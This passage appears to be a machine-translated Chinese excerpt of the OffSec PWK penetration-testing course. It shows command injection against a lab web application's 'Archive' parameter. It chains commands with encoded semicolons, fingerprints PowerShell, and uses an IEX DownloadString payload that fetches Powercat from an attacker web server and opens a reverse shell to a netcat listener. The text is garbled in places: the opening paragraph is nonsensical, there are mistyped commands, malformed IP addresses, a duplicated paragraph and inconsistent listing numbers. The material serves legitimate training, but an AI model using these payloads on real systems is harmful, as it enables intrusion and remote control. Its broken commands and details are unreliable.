

# 注意：我们的业务经营得不太顺利……我们决定转向技术领域！

由于我们发现我们的代码需要创建任何解密数量。无论如何，我们聘佣了一个新员工，他有一个非常棒的构意。我们将提供一个归档、备份和处理请求的服务。我们使用量子加密来保护客户的数据。如果我们需要你帮助处理请求，并在上线时，你将获得一个免费的剩余甜甜和 10 天免费 VIP 订阅。

在下方的输入框中以下命令：

```
$ git clone repository_URL
$ git clone https://github.com/username repository
```

![](img/336d6ea891e7464f18ad64426619ced4_279_0.png)

图 144：ExploitDB 仓库的克隆命令

点击 ExploitDB 仓库的克隆过程后。

![](img/336d6ea891e7464f18ad64426619ced4_279_1.png)

图 145：通过 Web 应用程序成功克隆 ExploitDB 仓库

输出显示仓库已成功克隆。

在实验室环境中克隆仓库会导致错误。但是，为了跟随操作，我们可以直接跳过此步。

此外，实际命令显示在 Web 应用程序的输出中。让我们尝试使用 curl 配合 `ifconfig`、`itconfig` 和 `hostname` 注入任意命令。我们将切换到 Burp 的 HTTP 历史来理解 POST 请求。请求指示命令的 "Archive" 参数。

```
POST /archive HTTP/1.1
Host: 192.168.1.100:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 55

Archive=itconfig%3Dgithub.com%2Foffensive-security%2Fexploit
```

![](img/336d6ea891e7464f18ad64426619ced4_279_2.png)

图 146：POST 请求中的 Archive 参数

图片显示 "Archive" 参数包含 Git 命令。这意味着我们可以使用 curl 将我们的命令提供给 POST。我们将通过使用 -X 参数将请求类型更改为 POST。我们还将使用 -data 来指定在 POST 请求中发送的数据。

PWK - Copyright © 2023 OffSec Services Limited. 版权所有。

# OffSec

使用 Kali Linux 进行渗透测试

```
kali@kali:~$ curl -X POST --data...=ipconfig 'Archive=http://192.168.50.189:8000/archive
```

检测到命令注入。正在中止...%(EXTRA string:=ipconfig)

列表 166 - 检测到 ipconfig 的命令注入

在第一次尝试中，我们的 Web 应用程序检测到了使用 ipconfig 命令的命令注入尝试。让我们尝试从有效的输入回溯，并寻找过滤器的绕过方法。接下来，我们将尝试为 POST 请求中的 Archive 参数提供 git 命令。

```
kali@kali:~$ curl -X POST --data 'Archive=git' http://192.168.50.189:8000/archive
```

执行时发生错误：退出状态 1，使用：git [--version] [--help] [-C <path>] [-c <name>=<value>] [--exec<path>] [--path] [--man-path] [--info-path] [-p] |paginate| [-p] |no-path| [----no-replace] [--bare]

push update remote remotes with associated associates

'git help -a' 和 'git help -g' 列出子命令和概念指南。查看 'git help <command>' 或 'git help <concept>' 来阅读特定子命令或概念。查看 'git help git' 获取系统概览。

输出显示了 git 命令的页面，确认我们不仅限于使用 git。由于我们知道提供 "git" 可以执行，我们可以尝试指定任何 git 命令并执行。如果执行了它，我们将确定 Web 应用程序运行在 Windows 还是 Linux 上，git 的输出包含 "Windows" 字符串则说明是 Windows。如果 Web 应用程序运行在 Linux 上，它将只显示版本号。

```
kali@kali:~$ curl -X POST -data 'Archive=git version' http://192.168.50.189:8000/archive
```

仓库已成功连接，命令：git version 和 2.35.windows

列表 167 - 使用 git 操作操作系统

输出显示 Web 应用程序运行在 Windows 上。现在我们可以通过试错来探测过滤器并查看哪些允许的。既然确定不能简单地指定另一个命令，让我们尝试用 URL 编码的分号 "%3B" 将 git 和 ipconfig 命令结合。分号可以用于大多数命令行（例如 PowerShell 或 Bash），使用 "&&" 作为分隔符来指定连续命令。或者，我们可以使用另一种方法。

- 443 (Git SCM, 2022), https://git-scm.com/docs/git/
- 444 (Git for Windows, 2022), https://gitfor.org/
- 445 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows-server/administration/windows

PWK - Copyright © 2023 OffSec Services Limited. 版权所有。

```
kali@kali:~$ curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive
```

git help -a 和 'git help -g' 列出可用命令和概念指南。查看 'git help <command>' 或 'git help <command>' 来阅读特定子命令或概念。查看 'git help!' 获取系统概览。

# Windows 配置

| 连接特定后缀 | |
| :--- | --- |
| IPv4 地址 | 192.168.50.189 |
| 子网掩码 | 255.255.255.0 |
| 默认网关 | 192.168.50.254 |

列表 168 - 使用分号输入 git 和 ipconfig

输出显示两个命令都执行了。我们可以确保 "git" 执行于 "Archive" 参数。接下来，让我们查看注入命令如何执行。我们将首先确定命令是在 PowerShell 还是 CMD 中执行。在这种情况下，我们可以使用 PowerShell 发布的实用片段，显示 "CMD" 或 "PowerShell"，取决于执行位置。

```
dir>&1 * [echo CMD];<rem # PowerShell
```

列表 169 - 检查执行位置的代码片段

```
kali@kali:~$ curl -X POST --data 'Archive=git%3B(dir%20%23%26%20echo%20CMD)%3B%26%3C%20rem%23%3Eecho%20PowerShell=http://192.168.50.189/archive'
```

输出包含 "PowerShell"，意味着我们的注入命令在 PowerShell 环境中执行。接下来，让我们利用命令注入实现系统访问。我们将使用 Powercat 创建反弹 Shell。Powercat 是 Kali 中的 PowerShell 实现。让我们启动新终端，将 Powercat 复制到家目录，并在其中启动 Python3 Web 服务器。

```
kali@kali:~$ cp /usr/share/powershell-server/data/module_source/management/powercat.ps
```

- 446 (Stackoverflow, 2020), https://stackoverflow.com/users/403407/user43407
- 447 (Github, 2020), https://github.com/besiminhoorno/powercat

```
kali@kali:~$ python3 -m httpserver 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

列表 171 - 通过 Python3 Web 服务器启动 Powercat

接下来，我们将启动第三个终端，在端口 4444 创建 Netcat 监听以接收反弹 Shell。

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

列表 172 - 在端口 4444 启动 Netcat 监听

输出显示 Web 应用程序运行在 Windows 上。现在我们可以通过试错探测过滤器并查看哪些允许的。既然确定不能简单地指定另一个命令，让我们尝试用 URL 编码的分号 "%3B" 将 git 和 ipconfig 命令结合。分号可以用于大多数命令行（例如 PowerShell 或 Bash），使用 "&&" 作为分隔符来指定连续命令。或者，我们可以使用另一种方法。

```
kali@kali:~$ curl -X POST --data 'Archive=IEX(New-Object System.WebClient).DownloadString("http://192.168.119/powercat.ps");powercat -c192.168.119.3 -p4444 -e powershell' http://192.168.119:8000/archive
```

列表 173 - 下载 Powercat 并执行 shell

再次，我们使用 curl 编码命令并发送到服务器。

```
kali@kali:~$ python3 -m httpserver 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

列表 174 - Powercat Web 服务器显示 powercat 的 GET 请求

192.168.50.189 - [05/Apr/2022 09:05:48] GET /powercat.ps HTTP/1.1" 200 -
```

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.119.3] from [UNKNOWN] [192.168.50.189] 50325
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
PS C:\Users\Administrator\meteor>
```

列表 175 - 通过命令注入成功连接反弹 Shell

列表 176 显示我们收到了反弹 Shell。与其使用 powercat，我们也可以直接注入 PowerShell 反弹 Shell。有很多方法可以利用命令注入

